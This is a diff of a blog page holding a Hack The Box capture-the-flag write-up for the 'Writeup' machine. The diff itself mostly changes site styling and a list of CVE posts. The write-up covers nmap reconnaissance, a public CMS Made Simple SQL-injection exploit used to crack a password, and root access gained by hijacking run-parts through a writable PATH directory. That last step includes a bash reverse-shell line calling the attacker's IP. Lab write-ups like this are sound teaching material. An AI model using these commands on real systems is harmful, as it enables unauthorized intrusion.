@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-writeup-writeup\/"
@@ -509,7 +513,7 @@
 <h1 id="information-gathering">Information Gathering</h1>
 <h2 id="nmap">Nmap</h2>
 <p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC 10.10.10.138
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# nmap -sVC 10.10.10.138
 </span></span><span style="display:flex;"><span>Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-17 20:23 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.138
 </span></span><span style="display:flex;"><span>Host is up (0.37s latency).
@@ -530,7 +534,7 @@
 </span></span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds
 </span></span></code></pre></div><p>From the above output we can see that ports, <strong>22</strong> and <strong>80</strong> are the only ports open. It also appears as though there&rsquo;s a <code>robots.txt</code> file disallowing a directory called <code>/writeup</code> on the web server.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.138/robots.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl http://10.10.10.138/robots.txt
 </span></span><span style="display:flex;"><span>#              __
 </span></span><span style="display:flex;"><span>#      _<span style="color:#f92672">(</span><span style="color:#ae81ff">\ </span>   |@@|
 </span></span><span style="display:flex;"><span>#     <span style="color:#f92672">(</span>__/<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\-</span>-/ __
@@ -550,7 +554,7 @@
 <p>We can determine that the site is running <a href="https://www.cmsmadesimple.org/" target="_blank">CMS Made Simple</a>. This can be done by checking the source code, but in my case the Firefox extension <a href="https://www.wappalyzer.com/" target="_blank">Webappalyzer</a> indicated such. After browsing unauthenticated exploits for the CMS we come across one that works perfectly <a href="https://www.exploit-db.com/exploits/46635" target="_blank">https://www.exploit-db.com/exploits/46635</a>.</p>
 <h1 id="exploitation">Exploitation</h1>
 <p>In order to gain our initial foothold we execute the exploit with the <code>rockyou.txt</code> worldlist in order for it to crack the hashed password.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/Desktop# python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span>[+] Salt for password found: 5a599ef579066807
 </span></span><span style="display:flex;"><span>[+] Username found: jkr
@@ -584,7 +588,7 @@ d4e493fd4068afc9eb1aa6a55319f978
 <p>The privilege escalation for this box was not as immediately apparent to me as it was on SwagShop. Running <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">Linux Smart Enumeration</a> did not return anything very useful for me. Some users on the forum indicated using a tool called <a href="https://github.com/DominicBreuker/pspy" target="_blank">Pspy</a>. This tool allows us to &ldquo;Monitor Linux processes without root permissions&rdquo;. After running this script for a while something interesting appears when other users access the box via ssh.</p>
 <p><img src="/posts/images/hack-the-box-writeup-writeup/pyspy.png" alt="output from pyspy"></p>
 <p>The <code>PATH</code> variable contains a directory <code>/usr/local/sbin</code> as its first priority.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:~$ cd /usr/local/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:~$ cd /usr/local/
 </span></span><span style="display:flex;"><span>jkr@writeup:/usr/local$ ls -la
 </span></span><span style="display:flex;"><span>total 64
 </span></span><span style="display:flex;"><span>drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
@@ -600,12 +604,12 @@ d4e493fd4068afc9eb1aa6a55319f978
 </span></span><span style="display:flex;"><span>drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
 </span></span></code></pre></div><p>As we see above, we also have access to write to and execute scripts from the <code>/usr/local/sbin</code> directory. This means that we can create our own <code>run-parts</code> to execute other scripts as root. So lets do that.</p>
 <p>First we create a script to call our reverse shell, because adding the reverse shell directly to <code>run-parts</code> didn&rsquo;t seem to be doing the trick.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:/usr/local/sbin$ nano shelly.sh &amp;&amp; chmod +x shelly.sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:/usr/local/sbin$ nano shelly.sh &amp;&amp; chmod +x shelly.sh
 </span></span></code></pre></div><p>Here is what <code>shelly.sh</code> contains.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh  
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh  
 </span></span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/10.10.14.52/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><p>Next we actually create the <code>run-parts</code> script within <code>/usr/local/sbin</code> so that it calls <code>shelly.sh</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:/usr/local/sbin$ nano run-parts &amp;&amp; chmod +x run-parts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>jkr@writeup:/usr/local/sbin$ nano run-parts &amp;&amp; chmod +x run-parts
 </span></span></code></pre></div><p>When we ssh in again from another terminal, we&rsquo;ll get our reverse shell with root privileges.</p>
 <p><img src="/posts/images/hack-the-box-writeup-writeup/rooted.png" alt="tmux screenshot of achieving root privileges"></p>
 <h1 id="conclusion">Conclusion</h1>
